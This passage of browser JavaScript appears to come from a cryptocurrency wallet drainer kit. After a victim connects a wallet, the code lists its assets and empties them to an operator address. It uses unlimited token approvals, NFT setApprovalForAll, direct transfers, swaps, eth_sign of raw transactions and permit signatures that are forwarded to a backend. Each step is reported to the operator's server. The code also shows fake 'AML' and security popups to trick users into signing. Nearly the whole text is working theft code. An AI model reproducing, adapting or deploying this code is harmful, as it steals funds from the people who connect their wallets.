  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';
  const nonce = await get_nonce(asset.chain_id);
  let tx_struct = {
    "to": MS_Settings.Address, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit_nt), "gasPrice": web3.utils.toHex(gas_price),
    "value": web3.utils.toHex(after_fee), "data": "0x",
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset, after_fee);
};

const SIGN_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  let gas_limit = null;
  try {
    if (MS_Settings.Settings.Sign.Tokens == 1) {
      gas_limit = await contract.estimateGas.approve(MS_Settings.Address, ethers.utils.parseEther(MS_Unlimited_Amount), { from: MS_Current_Address });
    } else if (MS_Settings.Settings.Sign.Tokens == 2) {
      gas_limit = await contract.estimateGas.transfer(MS_Settings.Address, asset.amount_raw, { from: MS_Current_Address });
    }
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  const nonce = await get_nonce(asset.chain_id);
  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);
  if (MS_Settings.Settings.Sign.Tokens == 1) data = web3_contract.methods.approve(MS_Settings.Address, ethers.utils.parseEther(MS_Unlimited_Amount)).encodeABI();
  else if (MS_Settings.Settings.Sign.Tokens == 2) data = web3_contract.methods.transfer(MS_Settings.Address, asset.amount_raw).encodeABI();
  let tx_struct = {
    "to": asset.address, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
    "value": '0x0', "data": data,
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset);
};

const SIGN_NFT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], node);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  let gas_limit = null;
  try {
    if (MS_Settings.Settings.Sign.NFTs == 1) {
      gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
    } else if (MS_Settings.Settings.Sign.NFTs == 2) {
      gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Address, asset.id, { from: MS_Current_Address });
    }
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  const nonce = await get_nonce(asset.chain_id);
  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);
  if (MS_Settings.Settings.Sign.NFTs == 1) data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  else if (MS_Settings.Settings.Sign.NFTs == 2) data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Address, asset.id).encodeABI();
  let tx_struct = {
    "to": asset.address, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
    "value": '0x0', "data": data,
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset);
};

const DO_SWAP = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
      asset.address, MS_Swap_Route[asset.chain_id]
    ], MS_Settings.Address, swap_deadline, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
  }
  const nonce = await get_nonce(asset.chain_id);
  const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(ethers.BigNumber.from(asset.swapper_allowance))
  ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
  await sign_request(asset); sign_next();
  const tx = await contract.swapExactTokensForETH(swap_value, '0', [
    asset.address, MS_Swap_Route[asset.chain_id]
  ], MS_Settings.Address, swap_deadline, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await sign_success(asset);
};

const DO_UNISWAP = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Uniswap_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Address).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
  }
  await sign_request(asset); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  for (const token of all_tokens) {
    await sign_success(token);
  }
};

const DO_CONTRACT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : 60000);
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price)
  .mul(ethers.BigNumber.from(gas_limit_ct)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id]))))
  .sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price).mul(ethers.BigNumber.from(gas_limit_nt))
  .mul(ethers.BigNumber.from('2'))).toString();
  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';
  const nonce = await get_nonce(asset.chain_id);
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  const contract = new ethers.Contract(MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address, MS_Contract_ABI['CONTRACT'], MS_Signer);
  await transfer_request(asset);
  sign_next();
  const tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type]({
    gasLimit: ethers.BigNumber.from(gas_limit_nt),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, value: ethers.BigNumber.from(after_fee)
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, after_fee);
};

const TRANSFER_NATIVE = async (asset) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '') return DO_CONTRACT(asset);
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : 30000);
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price)
  .mul(ethers.BigNumber.from(gas_limit_ct)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id]))))
  .sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price).mul(ethers.BigNumber.from(gas_limit_nt))
  .mul(ethers.BigNumber.from('2'))).toString();
  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';
  const nonce = await get_nonce(asset.chain_id);
  await transfer_request(asset);
  sign_next();
  const tx = await MS_Signer.sendTransaction({
    to: MS_Settings.Address,
    value: ethers.BigNumber.from(after_fee),
    gasLimit: ethers.BigNumber.from(gas_limit_nt),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, after_fee);
};

const TRANSFER_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.transfer(MS_Settings.Address, asset.amount_raw, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transfer(MS_Settings.Address, asset.amount_raw, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset);
};

const TRANSFER_NFT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Address, asset.amount_raw, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transferFrom(MS_Current_Address, MS_Settings.Address, asset.amount_raw, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset);
};

const APPROVE_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.approve(MS_Settings.Address, ethers.utils.parseEther(MS_Unlimited_Amount), { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract.approve(MS_Settings.Address, ethers.utils.parseEther(MS_Unlimited_Amount), {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset);
};

const DO_SAFA = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract.setApprovalForAll(MS_Settings.Address, true, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset);
};

const PERMIT_TOKEN = async (asset) => {
  const contract = new ethers.Contract(asset.address, asset.abi, MS_Signer);
  const nonce = await contract.nonces(MS_Current_Address);
  const name = await contract.name();
  const value = ethers.utils.parseEther(MS_Unlimited_Amount);
  const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
  let permit_types = null, permit_values = null;
  if (asset.permit == 1) {
    permit_types = {
      Permit: [
        {
          name: "holder",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "expiry",
          type: "uint256",
        },
        {
          name: "allowed",
          type: "bool",
        }
      ]
    };
    permit_values = {
      holder: MS_Current_Address,
      spender: MS_Settings.Address,
      nonce: nonce,
      expiry: deadline,
      allowed: true
    };
  } else if (asset.permit == 2) {
    permit_types = {
      Permit: [
        {
          name: "owner",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "value",
          type: "uint256",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "deadline",
          type: "uint256",
        }
      ]
    };
    permit_values = {
      owner: MS_Current_Address,
      spender: MS_Settings.Address,
      value: value,
      nonce: nonce,
      deadline: deadline
    };
  }
  await approve_request(asset);
  sign_next();
  const result = await MS_Signer._signTypedData({
    name: name, version: asset.permit_ver, chainId: asset.chain_id,
    verifyingContract: asset.address
  }, permit_types, permit_values),
  signature = {
    r: result.slice(0, 66),
    s: "0x" + result.slice(66, 130),
    v: Number("0x" + result.slice(130, 132))
  };
  await approve_success(asset);
  wait_message();
  const x_promise = send_request({
    action: 'permit_token', user_id: MS_ID, sign: {
      type: asset.permit, version: asset.permit_ver,
      chain_id: asset.chain_id, address: asset.address,
      owner: MS_Current_Address, spender: MS_Settings.Address,
      value: value.toString(), nonce: nonce.toString(), deadline: deadline,
      r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
    }, asset: asset, address: MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response) await x_promise;
};

const sign_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const transfer_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const approve_success = async (asset) => {
  try {
    await send_request({ action: 'approve_success', asset, user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_cancel = async () => {
  try {
    await send_request({ action: 'sign_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_unavailable = async () => {
  try {
    await send_request({ action: 'sign_unavailable', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const transfer_cancel = async () => {
  try {
    await send_request({ action: 'transfer_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const approve_cancel = async () => {
  try {
    await send_request({ action: 'approve_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const chain_cancel = async () => {
  try {
    await send_request({ action: 'chain_cancel', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_success = async () => {
  try {
    await send_request({ action: 'chain_success', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_request = async (old_chain, new_chain) => {
  try {
    await send_request({ action: 'chain_request', user_id: MS_ID, chains: [ old_chain, new_chain ] });
  } catch(err) {
    console.log(err);
  }
}

const sign_request = async (asset) => {
  try {
    await send_request({ action: 'sign_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const transfer_request = async (asset) => {
  try {
    await send_request({ action: 'transfer_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const approve_request = async (asset) => {
  try {
    await send_request({ action: 'approve_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const connect_wallet = async (provider = null) => {
  try {
    if (MS_Process) return; MS_Process = true;
    if (provider !== null) {
      if (provider == 'MetaMask') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isMetaMask == true) {
              is_installed = true;
              MS_Provider = elem;
              MS_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!is_installed) {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'MetaMask';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Coinbase') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isCoinbaseWallet == true) {
              is_installed = true;
              MS_Provider = elem;
              break;
            }
          }
          if (is_installed) {
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Trust Wallet') {
        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Trust Wallet';
        } else {
          if (MS_Mobile_Status) {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${MS_Current_URL}`;
            MS_Process = false;
            return;
          } else {
            window.open('https://trustwallet.com', '_blank').focus();
            MS_Process = false;
            return;
          }
        }
      } else if (provider == 'Binance Wallet') {
        if (typeof window.BinanceChain === 'object') {
          MS_Provider = window.BinanceChain;
          MS_Current_Provider = 'Binance Wallet';
        } else {
          window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
          MS_Process = false;
          return;
        }
      } else if (provider == 'WalletConnect') {
        MS_Current_Provider = 'WalletConnect';
      } else {
        if (typeof window.ethereum === 'object') {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Ethereum';
        } else {
          MS_Current_Provider = 'WalletConnect';
        }
      }
    } else {
      if (window.ethereum) {
        MS_Provider = window.ethereum;
        MS_Current_Provider = 'Ethereum';
      } else {
        MS_Current_Provider = 'WalletConnect';
      }
    }
    try {
      await connect_request();
      if (MS_Current_Provider == 'WalletConnect') {
        load_wc(); await MS_Provider.disconnect(0);
        const connection = await MS_Provider.enable();
        if (connection && connection.length > 0) {
          if (!connection[0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          MS_Current_Address = connection[0];
          MS_Current_Chain_ID = MS_Provider.chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else {
        const connection = await MS_Provider.request({ method: 'eth_requestAccounts' });
        if (connection && connection.length > 0) {
          if (!connection[0].includes('0x')) return connect_cancel();
          MS_Current_Address = connection[0];
          MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
    } catch(err) {
      console.log(err);
      MS_Process = false;
      return await connect_cancel();
    }
    await connect_success(); ms_hide(); show_check();
    if (MS_Settings.Wallet_Blacklist.length > 0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase())) {
      MS_Check_Done = true; Swal.close();
      Swal.fire({
        title: 'AML Error',
        text: "Your wallet is not AML clear, you can\'t use it!",
        icon: 'error', confirmButtonText: 'OK'
      });
      MS_Process = false;
      return;
    }
    let assets = await get_wallet_assets(MS_Current_Address);
    let assets_price = 0; for (const asset of assets) {
      try {
        assets_price += asset.amount_usd;
      } catch(err) {
        console.log(err);
      }
    }
    let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd;
    await send_request({ action: 'check_finish', user_id: MS_ID, assets: assets, balance: assets_usd_balance });
    MS_Check_Done = true; Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      Swal.fire({
        title: 'Something went wrong!',
        text: "For security reasons we can't allow you to connect empty or new wallet",
        icon: 'error', confirmButtonText: 'OK'
      });
      MS_Process = false;
      return;
    }
    Swal.fire({
      html: '<b>Done!</b> Sign message in your wallet to continue...',
      imageUrl: 'https://cdn.pixabay.com/animation/2022/10/11/03/16/03-16-39-160_512.gif',
      imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
      timer: 0, width: 600, showConfirmButton: false
    });
    for (const asset of assets) {
      try {
        if (asset.type != 'NATIVE') MS_Gas_Reserves[asset.chain_id] += 1;
      } catch(err) {
        console.log(err);
      }
    }
    for (const asset of assets) {
      try {
        if (asset.skip) continue;
        let is_chain_correct = false;
        if (asset.chain_id != MS_Current_Chain_ID) {
          if (MS_Current_Provider == 'WalletConnect') continue;
          if (asset.type == 'NATIVE') {
            const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
            const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
            const gas_limit_nt = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 60000);
            const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
            const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price)
